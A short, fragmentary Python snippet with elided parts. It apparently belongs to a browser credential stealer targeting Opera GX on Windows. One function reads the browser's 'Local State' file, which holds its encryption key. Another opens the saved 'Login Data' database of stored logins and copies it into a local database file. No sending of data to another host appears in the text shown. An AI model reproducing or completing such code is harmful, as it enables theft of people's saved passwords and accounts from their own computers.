...
def key():
    with open(os.getenv("APPDATA") + r'\..\Roaming\Opera Software\Opera GX Stable\Local State', "r") as f:
        local_state = f.read()
...
def windows_opera():
    login_db = os.getenv("APPDATA") + r'\..\Roaming\Opera Software\Opera GX Stable\Login Data'
    conn = sqlite3.connect(login_db)
    conn2 = sqlite3.connect('operagx.db')
    cursor = conn.cursor()
